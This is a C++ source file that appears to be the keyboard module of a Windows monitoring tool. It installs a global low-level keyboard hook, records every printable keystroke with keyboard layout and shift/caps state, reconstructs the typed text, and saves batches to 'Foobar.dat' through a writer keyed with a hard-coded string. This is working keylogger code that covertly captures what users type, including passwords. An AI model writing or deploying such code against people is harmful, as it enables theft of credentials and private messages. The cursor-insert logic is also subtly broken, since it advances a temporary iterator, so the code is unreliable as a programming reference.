#include "services.hpp"
#if KEYBOARD_SERVICE

using namespace lrcdata;

void services::keyboard::run()
{
	// Exit function if service is already running
	if (isRunning)
	{
		return;
	}

	isRunning = true;
	clear();

	if (hhkLowLevelKybd == NULL)
	{
		hhkLowLevelKybd = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	}

	vkQueueThread = std::thread(processqueue);
}

void services::keyboard::stop()
{
	if (!isRunning)
	{
		return;
	}

	isRunning = false;
	vkQueueThread.join();

	if (hhkLowLevelKybd != NULL)
	{
		UnhookWindowsHookEx(hhkLowLevelKybd);
		hhkLowLevelKybd = NULL;
	}
}


void services::keyboard::processqueue()
{
	while (isRunning)
	{
		if (!vkQueue.empty())
		{
			VKInfo vkInfo = vkQueue.front().vkInfo;
			vkQueue.pop();

			switch (vkInfo.keyCode)
			{
			case VK_BACK:
				onBackspace();
				break;
			case VK_DELETE:
				onDelete();
				break;
			case VK_UP:
				// Point cursor to the start
				vkListCursor = vkListCursorBegin;
				break;
			case VK_DOWN:
				// Point cursor to the end
				vkListCursor = vkList.size();
				break;
			case VK_LEFT:
				// Shift virtual-key cursor to left if cursor isn't at begining
				if (vkListCursor > vkListCursorBegin)
				{
					vkListCursor--;
				}
				break;
			case VK_RIGHT:
				// Shift virtual-key cursor to right if cursor isn't at end
				if (vkListCursor < vkList.size())
				{
					vkListCursor++;
				}
				break;
			}

			if (vkInfo.keyCode != 0)
			{
				processvk(vkInfo);
			}
		}
		Sleep(50);
	}
}

LRESULT CALLBACK services::keyboard::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT* dllHookStruct = (KBDLLHOOKSTRUCT*)lParam;

		bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
		bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

		PartKeyboard pk;
		pk.subtype = LRCDATA_KEYBOARD_SUBTYPE_VKINFO;
		pk.vkInfo.keyCode = dllHookStruct->vkCode;
		pk.vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
		pk.vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;

		vkQueue.push(pk);
	}

	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
}

void services::keyboard::processvk(VKInfo vkInfo)
{
	// Filter virtual-key repeats
	if (vkcmp(vkInfo, lastKeyPressed))
	{
		if (vkRepeats != KBD_MAX_REPEATS)
		{
			vkRepeats++;
		}
		else
		{
			return;
		}
	}
	else
	{
		vkRepeats = 0;
		lastKeyPressed = vkInfo;
	}

	if (isprintable(vkInfo.keyCode))
	{
		PKList::iterator it = vkList.begin();
		std::advance(vkList.begin(), vkListCursor);

		PartKeyboard toAdd;
		toAdd.subtype = 0x1;
		toAdd.vkInfo = vkInfo;

		// Insert virtual-key into vkList at cursor position
		vkList.insert(it, toAdd);

		vkEvents++;

		if (vkEvents == KBD_KEYS_TO_SAVE)
		{
			save();
		}
	}
	else
	{
		vkListCursor = vkListCursorBegin = vkList.size();
	}
}

void services::keyboard::save()
{
	LRCDataWriter writer("fe6340be87fd5e43b7f0cac5741e76205dd69a68b2024fda16c696848a720f7a");
	writer.WriteData("Foobar.dat", vkList);

	// Prepare buffer to next virtual-key sequence
	vkListCursorBegin = 0;
	vkListCursor = 0;
	vkEvents = 0;
	vkList.clear();
}

void services::keyboard::onDelete()
{
	if (vkListCursor >= vkListCursorBegin && vkListCursor < vkList.size())
	{
		PKList::iterator it = vkList.begin();
		std::advance(it, vkListCursor);
		vkList.erase(it);
	}
}

void services::keyboard::onBackspace()
{
	if (vkListCursor > vkListCursorBegin && vkListCursor < vkList.size() + 1)
	{
		PKList::iterator it = vkList.begin();
		std::advance(it, vkListCursor - 1);
		vkList.erase(it);
		vkListCursor--;
	}
}

// Initial assignment
void services::keyboard::clear()
{
	vkEvents = 0;
	vkRepeats = 0;
	vkListCursorBegin = 0;
	vkListCursor = 0;
	lastKeyPressed.keyCode = 0;
	lastKeyPressed.lang = 0;
	lastKeyPressed.flags = 0;
	vkList.clear();
}

// Copmares two VirtualKeyInfo structures
bool services::keyboard::vkcmp(const VKInfo vk1, const VKInfo vk2)
{
	return (vk1.keyCode == vk2.keyCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
}

// Is virtual key appends text into text fields
bool services::keyboard::isprintable(const DWORD vkCode)
{
	return (vkCode == 0x20)						// Spacebar
		|| (vkCode >= 0x30 && vkCode <= 0x5A)	// 0 - 9, A - Z
		|| (vkCode >= 0x60 && vkCode <= 0x6F)	// Numpad keys
		|| (vkCode >= 0xBA && vkCode <= 0xE2);	// Different signs ([]'\;/.`)
}

#endif // KEYBOARD_SERVICE